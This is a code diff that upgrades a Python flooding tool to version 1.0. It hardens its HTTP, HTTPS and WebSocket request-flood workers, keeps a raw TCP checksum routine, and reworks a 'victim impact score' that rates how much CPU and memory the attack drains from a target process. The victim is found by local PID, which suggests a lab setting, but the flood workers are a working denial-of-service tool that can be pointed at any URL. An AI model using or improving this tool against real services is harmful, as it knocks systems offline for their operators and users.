@@ -25,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "0.9"
+VERSION = "1.0"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -122,7 +122,10 @@ def parse_ip_port(u):
 async def _read_http_response(reader):
     header_data = b''
     while b'\r\n\r\n' not in header_data:
-        chunk = await asyncio.wait_for(reader.read(1024), timeout=1.0)
+        try:
+            chunk = await asyncio.wait_for(reader.read(1024), timeout=5.0)
+        except asyncio.TimeoutError:
+            return b''
         if not chunk:
             return b''
         header_data += chunk
@@ -134,7 +137,10 @@ async def _read_http_response(reader):
         if line.lower().startswith('content-length:'):
             content_length = int(line.split(':', 1)[1].strip())
             while len(body) < content_length:
-                chunk = await asyncio.wait_for(reader.read(8192), timeout=1.0)
+                try:
+                    chunk = await asyncio.wait_for(reader.read(8192), timeout=5.0)
+                except asyncio.TimeoutError:
+                    break
                 if not chunk:
                     break
                 body += chunk
@@ -154,19 +160,21 @@ async def http_worker(name, url, stats, duration, stop, payload_size=0):
     req_bytes = req.encode()
     while not stop.is_set():
         try:
-            writer.write(req_bytes)
-            resp = await _read_http_response(reader)
+            async def _write_read():
+                writer.write(req_bytes)
+                await writer.drain()
+                return await _read_http_response(reader)
+            resp = await asyncio.wait_for(_write_read(), timeout=10.0)
+            if not resp:
+                stats.errors += 1
+                continue
             stats.requests += 1
             stats.bytes += len(resp)
-        except Exception:
+        except (asyncio.TimeoutError, Exception):
             stats.errors += 1
             break
     if writer.transport:
-        writer.transport.close()
-    try:
-        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
-    except Exception:
-        pass
+        writer.transport.abort()
 
 async def https_worker(name, url, stats, duration, stop, payload_size=0):
     host, port, path = parse_http(url)
@@ -179,19 +187,21 @@ async def https_worker(name, url, stats, duration, stop, payload_size=0):
     req_bytes = req.encode()
     while not stop.is_set():
         try:
-            writer.write(req_bytes)
-            resp = await _read_http_response(reader)
+            async def _write_read():
+                writer.write(req_bytes)
+                await writer.drain()
+                return await _read_http_response(reader)
+            resp = await asyncio.wait_for(_write_read(), timeout=10.0)
+            if not resp:
+                stats.errors += 1
+                continue
             stats.requests += 1
             stats.bytes += len(resp)
-        except Exception:
+        except (asyncio.TimeoutError, Exception):
             stats.errors += 1
             break
     if writer.transport:
-        writer.transport.close()
-    try:
-        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
-    except Exception:
-        pass
+        writer.transport.abort()
 
 async def ws_worker(name, url, stats, duration, stop, payload_size=128):
     host, port, path = parse_ws(url)
@@ -572,54 +582,119 @@ async def _sample_process(pid, interval=0.5, duration=5):
     return None
 
 async def _find_pid(port):
-    """Find PID listening on a port using lsof."""
+    """Find PID listening on a port using lsof, fallback to ps."""
+    loop = asyncio.get_event_loop()
     try:
-        r = await asyncio.create_subprocess_shell(
-            f"lsof -i :{port} -t 2>/dev/null | head -1",
-            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-        stdout, _ = await asyncio.wait_for(r.communicate(), timeout=5)
-        pid_str = stdout.decode().strip()
-        if pid_str:
+        out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
+            ['lsof', f'-i:{port}', '-t'], capture_output=True, text=True, timeout=5).stdout)
+        pid_str = out.strip().split('\n')[0].strip()
+        if pid_str.isdigit():
             return int(pid_str)
+    except Exception:
+        pass
+    # Fallback: scan ps for python/node processes
+    try:
+        out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
+            ['ps', '-eo', 'pid,command'], capture_output=True, text=True, timeout=5).stdout)
+        for line in out.splitlines():
+            parts = line.split(None, 1)
+            if len(parts) == 2 and ('victim' in parts[1] or 'cf-sim' in parts[1] or 'server.py' in parts[1]):
+                # Check if this process has the port (best effort: pick first match)
+                return int(parts[0])
     except Exception:
         pass
     return None
 
-async def impact_score(url, stats, duration):
-    """Compute victim impact score before/after the attack."""
+class CpuSampler:
+    """Sample a process's CPU% in the background using psutil."""
+    def __init__(self, pid):
+        self.pid = pid
+        self.samples = []
+        self._task = None
+    async def start(self):
+        import psutil
+        try:
+            self._proc = psutil.Process(self.pid)
+            self._proc.cpu_percent(None)  # prime
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            self._proc = None
+            return
+        loop = asyncio.get_event_loop()
+        async def _sample():
+            while True:
+                await asyncio.sleep(0.2)
+                if self._proc:
+                    cpu = await loop.run_in_executor(None, self._proc.cpu_percent, None)
+                    self.samples.append(cpu)
+        self._task = asyncio.create_task(_sample())
+    async def stop(self):
+        if self._task:
+            self._task.cancel()
+        if self.samples:
+            return sum(self.samples) / len(self.samples)
+        return 0.0
+
+async def impact_score(url, stats, duration, sampler=None):
+    """Compute victim impact score. All psutil calls in executor."""
+    loop = asyncio.get_event_loop()
     host, port = parse_ip_port(url)
-    victim_pid = await _find_pid(port)
+
+    def _get_pid():
+        try:
+            out = __import__('subprocess').run(
+                ['lsof', f'-i:{port}', '-t'],
+                capture_output=True, text=True, timeout=5).stdout
+            pid_str = out.strip().split('\n')[0].strip()
+            return int(pid_str) if pid_str.isdigit() else None
+        except Exception:
+            return None
+
+    def _sample(pid):
+        import psutil
+        try:
+            proc = psutil.Process(pid)
+            mem = proc.memory_info().rss
+            return mem
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            return 0
+
+    victim_pid = await loop.run_in_executor(None, _get_pid)
     if not victim_pid:
         return {"victim_pid": None, "note": "PID not found"}
 
-    import psutil
-    # Sample victim
-    victim_stats = await _sample_process(victim_pid, interval=0.5, duration=3)
+    # Sample victim mem
+    mem_bytes = await loop.run_in_executor(None, _sample, victim_pid)
 
-    # Our own process (quick sample)
-    our_pid = os.getpid()
-    our_stats = await _sample_process(our_pid, interval=0.1, duration=0.5)
+    rps = stats.rps(duration)
+    # CPU: use background sampler
+    if sampler:
+        cpu = await sampler.stop()
+    else:
+        # Fallback: quick sample
+        def _cpu():
+            import psutil
+            try:
+                p = psutil.Process(victim_pid)
+                p.cpu_percent(None)
+                import time as _t
+                _t.sleep(0.3)
+                return p.cpu_percent(None)
+            except Exception:
+                return 0
+        cpu = await loop.run_in_executor(None, _cpu)
 
     score = 0
-    if victim_stats:
-        # CPU contribution: victim CPU% during attack
-        score += min(victim_stats.get("avg_cpu_pct", 0), 100) * 0.5
-        # Memory: victim RSS
-        if victim_stats.get("max_mem_mb", 0) > 0:
-            score += min(victim_stats["max_mem_mb"] / 10, 50)
-
-    # Efficiency: our RPS vs victim load
-    rps = stats.rps(duration)
+    score += min(cpu, 100) * 0.5
+    score += min(mem_bytes / 1024 / 1024 / 10, 50)
     if rps > 0:
-        score += min(rps / 1000, 25)  # up to 25 pts for high RPS
+        score += min(rps / 1000, 25)
 
     return {
         "victim_pid": victim_pid,
-        "victim": victim_stats,
-        "attacker": our_stats,
+        "victim_cpu_pct": round(cpu, 1),
+        "victim_mem_mb": round(mem_bytes / 1024 / 1024, 1),
         "rps": round(rps, 1),
         "impact_score": round(score, 1),
-        "scale": "0-175 (CPU 0-50, Mem 0-50, Efficiency 0-25, +15 bonus for >10k RPS)",
     }
 
 # ═══════════════════════════════════════════════════════════════════
@@ -638,7 +713,7 @@ async def run(modes, url, conns, duration, stats, payload_size):
         for i in range(conns):
             workers.append(asyncio.create_task(worker_fn(i, url, stats, duration, stop, pl)))
     try:
-        await asyncio.wait_for(asyncio.gather(*workers, return_exceptions=True), timeout=duration + 5)
+        await asyncio.wait_for(asyncio.gather(*workers, return_exceptions=True), timeout=duration + 2)
     except asyncio.TimeoutError:
         pass
     stop.set()
@@ -668,17 +743,22 @@ def main():
 
     stats = Stats()
     payload_size = args.payload_size
-    asyncio.run(run(modes, args.url, args.connections, args.duration, stats, payload_size))
 
-    report = stats.report(modes, args.url, args.connections, args.duration)
+    async def _run_all():
+        sampler = None
+        if args.impact:
+            host, port = parse_ip_port(args.url)
+            victim_pid = await _find_pid(port)
+            if victim_pid:
+                sampler = CpuSampler(victim_pid)
+                await sampler.start()
+        await run(modes, args.url, args.connections, args.duration, stats, payload_size)
+        report = stats.report(modes, args.url, args.connections, args.duration)
+        if args.impact:
+            report["impact"] = await impact_score(args.url, stats, args.duration, sampler)
+        return report
 
-    if args.impact:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        impact = loop.run_until_complete(impact_score(args.url, stats, args.duration))
-        report["impact"] = impact
-        loop.close()
-
+    report = asyncio.run(_run_all())
     print(json.dumps(report, indent=2))
 
 if __name__ == "__main__":
